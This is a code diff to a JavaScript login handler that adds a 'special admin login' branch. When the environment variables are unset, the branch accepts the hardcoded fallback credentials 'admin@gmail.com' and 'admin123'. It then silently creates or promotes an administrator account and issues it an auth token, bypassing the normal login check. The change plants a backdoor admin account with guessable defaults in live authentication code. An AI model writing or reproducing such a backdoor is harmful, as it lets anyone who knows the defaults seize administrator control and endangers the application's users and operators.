@@ -68,6 +68,42 @@ const login = async (req, res) => {
     if (err) return error(res, err);
 
     const { mobile, password } = req.body;
+
+    // ── Special admin login via email ─────────────────────────────────────
+    const ADMIN_EMAIL    = process.env.ADMIN_EMAIL    || "admin@gmail.com";
+    const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "admin123";
+
+    if (mobile === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
+      // Find or create the admin account
+      let adminUser = await UserModel.findByMobile("00000000000");
+      if (!adminUser) {
+        const passwordHash = await bcrypt.hash(ADMIN_PASSWORD, BCRYPT_ROUNDS);
+        adminUser = await UserModel.create({
+          username: "Admin",
+          mobile:   "00000000000",
+          passwordHash,
+        });
+        const adminId = (adminUser._id || adminUser.id).toString();
+        await Promise.all([
+          WalletModel.init(adminId),
+          MissionModel.init(adminId),
+          FavoriteModel.init(adminId),
+        ]);
+        await UserModel.setAdmin(adminId, true);
+        adminUser = await UserModel.findByMobile("00000000000");
+      }
+      // Ensure admin flag is set
+      const adminId = (adminUser._id || adminUser.id).toString();
+      if (!adminUser.isAdmin) {
+        await UserModel.setAdmin(adminId, true);
+        adminUser = await UserModel.findById(adminId);
+      }
+      await UserModel.updateLastLogin(adminId);
+      const token = signToken(adminId);
+      return success(res, { token, user: UserModel.safe(adminUser) });
+    }
+    // ─────────────────────────────────────────────────────────────────────
+
     const user = await UserModel.findByMobile(mobile);
     if (!user) return error(res, "Invalid mobile or password", 401);
 
